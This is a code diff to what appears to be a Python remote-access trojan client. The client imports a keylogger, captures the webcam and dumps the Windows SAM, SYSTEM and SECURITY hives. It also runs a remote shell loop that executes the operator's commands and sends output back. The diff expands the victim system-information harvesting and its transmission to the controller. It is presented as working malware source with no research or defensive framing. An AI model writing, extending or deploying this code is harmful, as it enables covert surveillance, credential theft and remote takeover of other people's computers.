@@ -22,8 +22,6 @@ from mss import mss
 
 # Local application/library specific imports
 import keylogger
-# from mss import mss # mss v6.1.0
-# import requests # v2.28.0
 
 
 def reliable_send(data):
@@ -120,7 +118,7 @@ def get_sam_dump():
 
 
 def capture_webcam():
-    webcam = cv2.VideoCapture(0)
+    webcam = cv2.VideoCapture(1)
     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
 
     # Check if the webcam is available
@@ -187,69 +185,71 @@ def get_windows_system_info():
     system_info = {}
 
     # Basic system information
-    system_ = "['System'] " + pt.system()
-    system_name = "['Node Name'] " + pt.node()
-    system_release = "['Release'] " + pt.release()
-    system_version = "[Version] " + pt.version()
-    system_machine = "['Machine'] " + pt.machine()
-    system_processor = "['Processor'] "+pt.processor()
+    system_ = '[System] ' + pt.system()
+    system_name = '[Node Name] ' + pt.node()
+    system_release = '[Release] ' + pt.release()
+    system_version = '[Version] ' + pt.version()
+    system_machine = '[Machine] ' + pt.machine()
+    system_processor = '[Processor]' + pt.processor()
 
     # Network information
-    system_network_host = "['Hostname']" + socket.gethostname()
-    system_network_info = "['IP Address']" + socket.gethostbyname(socket.gethostname())
+    system_network_host = '[Hostname]' + socket.gethostname()
+    system_network_info = '[IP Address]' + socket.gethostbyname(socket.gethostname())
 
     # CPU information
-    system_cpu = "['CPU']" + cpuinfo.get_cpu_info()['brand_raw']
+    # system_cpu = '[CPU]' + cpuinfo.get_cpu_info()['brand_raw']
 
-    # Memory information
-    system_ram = "['RAM']" + round(psutil.virtual_memory().total / (1024 ** 3), 2)
+    # # Memory information
+    # system_ram = '[RAM]' + round(psutil.virtual_memory().total / (1024 ** 3), 2)
 
-    # Disk information
-    partitions = psutil.disk_partitions()
-    system_disk = "['Disk Partitions']" + [partition.device for partition in partitions]
+    # # Disk information
+    # partitions = psutil.disk_partitions()
+    # system_disk = '[Disk Partitions]' + [partition.device for partition in partitions]
 
-    # Additional information using WMI
+    # # Additional information using WMI
     wmi_obj = wmi.WMI()
     bios_info = wmi_obj.Win32_BIOS()[0]
-    system_bios = "['BIOS Version']" + bios_info.Version
+    system_bios = '[BIOS Version]' + bios_info.Version
 
-    for key, value in system_info.items():
-        about_sys += '1'
-    return system_, system_name
+    # for key, value in system_info.items():
+    #     about_sys += '1'
+    return system_, system_name, system_release, system_version, system_machine, system_processor, system_network_host, system_network_info, system_bios
+
+# , system_cpu, system_disk, system_bios
 
 
 
 
 
-def get_linux_system_info():
-    system_info = {}
+# def get_linux_system_info():
+#     system_info = {}
 
-    # Basic system information
-    system_info['System'] = pt.system()
-    system_info['Node Name'] = pt.node()
-    system_info['Release'] = pt.release()
-    system_info['Version'] = pt.version()
-    system_info['Machine'] = pt.machine()
-    system_info['Processor'] = pt.processor()
+#     # Basic system information
+#     system_info['System'] = pt.system()
+#     system_info['Node Name'] = pt.node()
+#     system_info['Release'] = pt.release()
+#     system_info['Version'] = pt.version()
+#     system_info['Machine'] = pt.machine()
+#     system_info['Processor'] = pt.processor()
 
-    # Network information
-    system_info['Hostname'] = socket.gethostname()
-    system_info['IP Address'] = socket.gethostbyname(socket.gethostname())
+#     # Network information
+#     system_info['Hostname'] = socket.gethostname()
+#     system_info['IP Address'] = socket.gethostbyname(socket.gethostname())
 
-    # CPU information
-    system_info['CPU'] = os.popen("lscpu | grep 'Model name' | awk -F: '{ print $2 }'").read().strip()
+#     # CPU information
+#     system_info['CPU'] = os.popen("lscpu | grep 'Model name' | awk -F: '{ print $2 }'").read().strip()
 
-    # Memory information
-    with open('/proc/meminfo') as mem_info:
-        for line in mem_info:
-            if 'MemTotal' in line:
-                system_info['RAM'] = round(int(line.split()[1]) / (1024 ** 2), 2)
+#     # Memory information
+#     with open('/proc/meminfo') as mem_info:
+#         for line in mem_info:
+#             if 'MemTotal' in line:
+#                 system_info['RAM'] = round(int(line.split()[1]) / (1024 ** 2), 2)
 
-    # Disk information
-    partitions = psutil.disk_partitions()
-    system_info['Disk Partitions'] = [partition.device for partition in partitions]
+#     # Disk information
+#     partitions = psutil.disk_partitions()
+#     system_info['Disk Partitions'] = [partition.device for partition in partitions]
 
-    return system_info
+#     return system_info
 
 
 
@@ -295,6 +295,7 @@ def get_linux_system_info():
 
 def shell():
     while True:
+        get_windows_system_info()
         command = reliable_recv()
         if command == 'quit':
             break
@@ -363,9 +364,9 @@ def shell():
         elif command[:12] == 'get_sam_dump':
             sam_dump, system_dump, security_dump = get_sam_dump()
             reliable_send((sam_dump, system_dump, security_dump))
-        elif command == 'about_sys':
-            system_i, system_namei = get_windows_system_info()
-            reliable_send((system_i, system_namei))
+        elif command[:9] == 'about_sys':
+            system_, system_name, system_release, system_version, system_machine, system_processor, system_network_host, system_network_info, system_bios = get_windows_system_info()
+            reliable_send((system_, system_name, system_release, system_version, system_machine, system_processor, system_network_host, system_network_info, system_bios))
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
